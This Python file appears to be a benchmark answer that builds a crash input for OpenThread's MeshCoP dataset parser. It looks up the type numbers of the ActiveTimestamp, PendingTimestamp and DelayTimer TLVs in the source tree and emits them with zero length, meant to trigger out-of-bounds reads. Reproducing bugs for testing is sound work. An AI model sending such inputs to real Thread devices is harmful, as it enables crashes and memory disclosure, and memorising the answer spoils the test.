import os
import re
import tarfile
from typing import Dict, List, Optional, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        texts = self._load_relevant_texts(src_path)
        macros = self._extract_macros(texts)

        active_type = self._find_tlv_type(texts, macros, "ActiveTimestamp")  # ActiveTimestampTlv
        pending_type = self._find_tlv_type(texts, macros, "PendingTimestamp")  # PendingTimestampTlv
        delay_type = self._find_tlv_type(texts, macros, "DelayTimer")  # DelayTimerTlv

        if active_type is None:
            active_type = 8
        if pending_type is None:
            pending_type = 9
        if delay_type is None:
            delay_type = 10

        active_type &= 0xFF
        pending_type &= 0xFF
        delay_type &= 0xFF

        prefix_len = self._detect_dataset_fuzzer_prefix_len(texts)
        prefix = b"\x00" * prefix_len

        # Too-short TLVs (length=0) intended to bypass missing minimum-length validation.
        # Keep input minimal to maximize chance of out-of-bounds reads when values are accessed.
        tlvs = bytes([active_type, 0, pending_type, 0, delay_type, 0])

        return prefix + tlvs

    def _load_relevant_texts(self, src_path: str) -> List[Tuple[str, str]]:
        exts = (".h", ".hpp", ".hh", ".c", ".cc", ".cpp", ".cxx", ".inc", ".ipp")
        keywords = (
            "meshcop",
            "dataset",
            "tlv",
            "timestamp",
            "delay",
            "fuzz",
            "fuzzer",
            "openthread",
        )

        def is_candidate(p: str) -> bool:
            lp = p.lower()
            if not lp.endswith(exts):
                return False
            return any(k in lp for k in keywords)

        texts: List[Tuple[str, str]] = []

        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    p = os.path.join(root, fn)
                    rel = os.path.relpath(p, src_path)
                    if not is_candidate(rel):
                        continue
                    try:
                        sz = os.path.getsize(p)
                        if sz > 5_000_000:
                            continue
                        with open(p, "rb") as f:
                            data = f.read()
                        texts.append((rel, data.decode("utf-8", errors="ignore")))
                    except Exception:
                        continue
            return texts

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name
                    if not is_candidate(name):
                        continue
                    if m.size > 5_000_000:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if not f:
                            continue
                        data = f.read()
                        texts.append((name, data.decode("utf-8", errors="ignore")))
                    except Exception:
                        continue
        except Exception:
            pass

        return texts

    def _strip_line_comments(self, line: str) -> str:
        idx = line.find("//")
        if idx >= 0:
            return line[:idx]
        return line

    def _extract_macros(self, texts: List[Tuple[str, str]]) -> Dict[str, str]:
        macros: Dict[str, str] = {}
        define_re = re.compile(r"^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.+?)\s*$")
        for _, text in texts:
            for raw_line in text.splitlines():
                line = self._strip_line_comments(raw_line).strip()
                if not line.startswith("#"):
                    continue
                m = define_re.match(line)
                if not m:
                    continue
                name = m.group(1)
                val = m.group(2).strip()
                if not val:
                    continue
                # Only keep the first "token/expression" on the line (simple macros).
                val = val.split()[0]
                macros[name] = val
        return macros

    def _resolve_expr_to_int(self, expr: str, macros: Dict[str, str], depth: int = 0) -> Optional[int]:
        if depth > 20:
            return None
        if expr is None:
            return None
        s = expr.strip()
        s = s.strip(";,")

        # Remove wrappers commonly seen in macros/constexpr initializers
        while True:
            ns = s.strip()
            if ns.startswith("(") and ns.endswith(")"):
                s = ns[1:-1].strip()
            else:
                break

        # Remove common suffixes
        s = re.sub(r"([0-9])([uUlL]+)\b", r"\1", s)

        # Direct numeric literal anywhere in expression
        m = re.search(r"(0x[0-9a-fA-F]+|\d+)", s)
        if m:
            try:
                return int(m.group(1), 0)
            except Exception:
                pass

        # Simple identifier macro
        if re.fullmatch(r"[A-Za-z_]\w*", s):
            if s in macros:
                return self._resolve_expr_to_int(macros[s], macros, depth + 1)
            return None

        # Scoped enum/macro like OT_MESHCOP_TLV_ACTIVE_TIMESTAMP
        tok = re.sub(r"[^A-Za-z0-9_]", " ", s).split()
        for t in tok:
            if t in macros:
                v = self._resolve_expr_to_int(macros[t], macros, depth + 1)
                if v is not None:
                    return v

        return None

    def _find_tlv_type(self, texts: List[Tuple[str, str]], macros: Dict[str, str], base: str) -> Optional[int]:
        # Try class-based extraction: <Base>Tlv::kType
        class_pat = re.compile(
            r"\bclass\s+" + re.escape(base) + r"Tlv\b[\s\S]{0,2000}?\bkType\s*=\s*([^;,\n}]+)",
            re.MULTILINE,
        )
        # Try enum-style: k<Base> = ...
        enum_pat = re.compile(
            r"\bk" + re.escape(base) + r"\b\s*=\s*([^,}\n]+)",
            re.MULTILINE,
        )
        # Try direct macro with these tokens
        macro_define_pat = re.compile(
            r"^\s*#\s*define\s+([A-Za-z_]\w*" + re.escape(base.upper()) + r"[A-Za-z_0-9]*\w*)\s+(.+?)\s*$",
            re.MULTILINE,
        )

        candidates: List[str] = []

        for _, text in texts:
            m = class_pat.search(text)
            if m:
                candidates.append(m.group(1))
            m2 = enum_pat.search(text)
            if m2:
                candidates.append(m2.group(1))
            for md in macro_define_pat.finditer(text):
                name = md.group(1)
                val = self._strip_line_comments(md.group(2)).strip().split()[0]
                macros.setdefault(name, val)
                candidates.append(val)

        # Also prefer known OpenThread macro names when present
        for pref in ("OT_MESHCOP_TLV_", "OT_MESH_COP_TLV_"):
            key = pref + re.sub(r"([a-z])([A-Z])", r"\1_\2", base).upper()
            if key in macros:
                candidates.insert(0, macros[key])

        for expr in candidates:
            v = self._resolve_expr_to_int(expr, macros)
            if v is not None and 0 <= v <= 255:
                return v

        # Fallback: search for any #define with exact token names
        target_tokens = [
            base.upper(),
            re.sub(r"([a-z])([A-Z])", r"\1_\2", base).upper(),
        ]
        for name, val in macros.items():
            up = name.upper()
            if "TLV" in up and any(t in up for t in target_tokens):
                v = self._resolve_expr_to_int(val, macros)
                if v is not None and 0 <= v <= 255:
                    return v

        return None

    def _detect_dataset_fuzzer_prefix_len(self, texts: List[Tuple[str, str]]) -> int:
        # Heuristic: detect if dataset fuzzer passes data+N into dataset APIs.
        # We'll only apply a prefix if we see consistent "+N" usage near dataset calls.
        calls = (
            "otDatasetSetActiveTlvs",
            "otDatasetSetPendingTlvs",
            "otDatasetParseTlvs",
            "Dataset::IsTlvValid",
        )
        best = 0
        for path, text in texts:
            lp = path.lower()
            if "fuzz" not in lp and "fuzzer" not in lp:
                continue
            if not any(c in text for c in calls):
                continue

            # Look for patterns like data + 1, data+2 near dataset calls
            for c in calls:
                for m in re.finditer(re.escape(c), text):
                    start = max(0, m.start() - 200)
                    end = min(len(text), m.end() + 200)
                    window = text[start:end]
                    mm = re.search(r"\bdata\s*\+\s*(\d+)\b", window)
                    if mm:
                        try:
                            n = int(mm.group(1))
                            if 0 <= n <= 16:
                                best = max(best, n)
                        except Exception:
                            pass
        return best if best > 0 else 0